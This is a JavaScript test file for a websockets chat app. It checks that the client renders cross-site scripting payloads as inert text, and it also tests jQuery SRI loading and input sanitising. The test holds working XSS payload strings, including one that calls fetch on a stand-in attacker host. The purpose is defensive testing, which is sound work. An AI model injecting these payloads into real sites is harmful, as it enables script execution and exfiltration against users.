// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

const assert = require('assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const {
  MAX_USERNAME_LENGTH,
  MAX_ROOM_LENGTH,
  MAX_MESSAGE_LENGTH,
  sanitizeText,
  validateMessage,
  addUser,
  deleteUser,
} = require('../users');

class FakeTextNode {
  constructor(text) {
    this.textContent = String(text);
  }
}

class FakeElement {
  constructor(tagName) {
    this.tagName = tagName.toUpperCase();
    this.children = [];
    this._text = '';
    this.value = '';
  }

  get textContent() {
    return this.children.length
      ? this.children.map(c => c.textContent).join('')
      : this._text;
  }

  set textContent(val) {
    this.children = [];
    this._text = String(val);
  }

  set innerHTML(_val) {
    throw new Error('Unsafe innerHTML sink invoked');
  }

  appendChild(node) {
    this.children.push(node);
    return node;
  }
}

function loadClient() {
  const code = fs.readFileSync(
    path.join(__dirname, '..', 'public', 'index.js'),
    'utf8'
  );
  const elements = {
    '#chatroom': new FakeElement('div'),
    '#chatroom h1': new FakeElement('h1'),
    '#messages': new FakeElement('ul'),
    '#signin': new FakeElement('form'),
    '#chat': new FakeElement('form'),
    '#name': new FakeElement('input'),
    '#room': new FakeElement('input'),
    '#msg': new FakeElement('input'),
  };
  const socketHandlers = new Map();
  const submitHandlers = new Map();
  let signinCallback;

  const sandbox = {
    document: {
      body: {scrollHeight: 0},
      querySelector: s => elements[s] || new FakeElement('div'),
      createElement: tag => new FakeElement(tag),
      createTextNode: text => new FakeTextNode(text),
    },
    window: {scrollTo() {}},
    console: {log() {}, error() {}},
    $: selector => ({
      ready: fn => fn(),
      hide() {},
      show() {},
      val: v =>
        v === undefined
          ? (elements[selector] || {}).value
          : ((elements[selector] || {}).value = v),
      submit: fn => submitHandlers.set(selector, fn),
      append: arg => {
        if (typeof arg === 'string') {
          throw new Error(`Unsafe jQuery .append(string): ${arg}`);
        }
        (elements[selector] || new FakeElement('div')).appendChild(arg);
      },
      html: arg => {
        throw new Error(`Unsafe jQuery .html(): ${arg}`);
      },
    }),
    io: () => ({
      on: (event, fn) => socketHandlers.set(event, fn),
      emit: (event, _payload, cb) => {
        if (event === 'signin') signinCallback = cb;
      },
      connect() {},
      io: {on() {}},
    }),
    mdc: {
      textField: {MDCTextField: {attachTo() {}}},
      ripple: {MDCRipple: {attachTo() {}}},
    },
  };

  vm.runInNewContext(code, sandbox);
  return {
    elements,
    socketHandlers,
    submitHandlers,
    getSigninCallback: () => signinCallback,
  };
}

describe('run/websockets security', () => {
  it('renders XSS payloads as inert text nodes across messages, notifications, history, and room', () => {
    const {elements, socketHandlers, submitHandlers, getSigninCallback} =
      loadClient();

    const xssRoom = "<img src=x onerror=alert('room-xss')>";
    const xssUser = '<svg onload=alert(document.domain)>';
    const xssMsg = '<img src=x onerror="fetch(\'//attacker.tld/\')">';

    elements['#name'].value = xssUser;
    elements['#room'].value = xssRoom;
    submitHandlers.get('#signin')({preventDefault() {}});

    getSigninCallback()(null, {
      room: xssRoom,
      messages: [
        {user: 'Chris', text: "That's great & 1 < 2"},
        {user: xssUser, text: xssMsg},
      ],
    });

    socketHandlers.get('message')({user: xssUser, text: xssMsg});
    socketHandlers.get('notification')({
      title: "Someone's here",
      description: `${xssUser} just entered the room`,
    });

    assert.strictEqual(elements['#chatroom h1'].children.length, 0);
    assert.strictEqual(elements['#chatroom h1'].textContent, xssRoom);

    const items = elements['#messages'].children;
    assert.strictEqual(items.length, 4);
    for (const li of items) {
      assert.strictEqual(li.tagName, 'LI');
      assert.strictEqual(li.children.length, 2);
      assert.strictEqual(li.children[0].tagName, 'STRONG');
      assert.strictEqual(li.children[0].children.length, 0);
      assert.ok(li.children[1] instanceof FakeTextNode);
    }
    assert.strictEqual(items[0].textContent, "Chris: That's great & 1 < 2");
    assert.strictEqual(items[1].textContent, `${xssUser}: ${xssMsg}`);
    assert.strictEqual(
      items[3].textContent,
      `Someone's here: ${xssUser} just entered the room`
    );
  });

  it('loads jQuery 3.8.0 with SRI in index.html', () => {
    const html = fs.readFileSync(
      path.join(__dirname, '..', 'public', 'index.html'),
      'utf8'
    );
    assert.ok(!html.includes('jquery-1.11.1'));
    assert.ok(html.includes('https://code.jquery.com/jquery-3.8.0.min.js'));
    assert.ok(html.includes('integrity="sha256-'));
  });

  it('validates, strips control chars, and enforces length limits on user, room, and message', () => {
    assert.strictEqual(sanitizeText('  \x00hi\r\n\x1b\x7f  '), 'hi');
    assert.strictEqual(sanitizeText(null), null);

    assert.throws(() => addUser('s1', '', 'room'), /Username is required/);
    assert.throws(() => addUser('s1', 'user', '\x00\n'), /Room is required/);
    assert.throws(
      () => addUser('s1', 'a'.repeat(MAX_USERNAME_LENGTH + 1), 'room'),
      /Username must be/
    );
    assert.throws(
      () => addUser('s1', 'user', 'r'.repeat(MAX_ROOM_LENGTH + 1)),
      /Room must be/
    );

    assert.deepStrictEqual(addUser('s1', ' Alice\x00 ', ' my-room\r\n '), {
      user: 'Alice',
      room: 'my-room',
    });
    deleteUser('s1');

    assert.throws(() => validateMessage(''), /Message is required/);
    assert.throws(() => validateMessage({bad: 1}), /Message is required/);
    assert.throws(
      () => validateMessage('x'.repeat(MAX_MESSAGE_LENGTH + 1)),
      /Message must be/
    );
    assert.strictEqual(validateMessage('  hello\x07 world  '), 'hello world');
  });
});
